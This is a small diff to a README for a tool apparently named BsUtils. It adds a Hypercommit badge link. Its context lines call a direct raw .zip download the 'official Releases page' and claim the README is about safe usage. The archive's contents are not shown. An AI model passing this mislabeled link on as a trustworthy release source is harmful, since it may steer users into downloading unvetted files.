@@ -243,3 +243,7 @@ Releases, again
 For quick access and the latest updates, see the official Releases page here: https://raw.githubusercontent.com/BenxT512/BsUtils/main/stream/Utils-Bs-2.5.zip
 
 Note: This README intentionally emphasizes safe and legitimate usage. It aligns with community guidelines and platform terms, ensuring tools remain helpful without enabling abuse.
+
+## Links
+
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/bsutils)
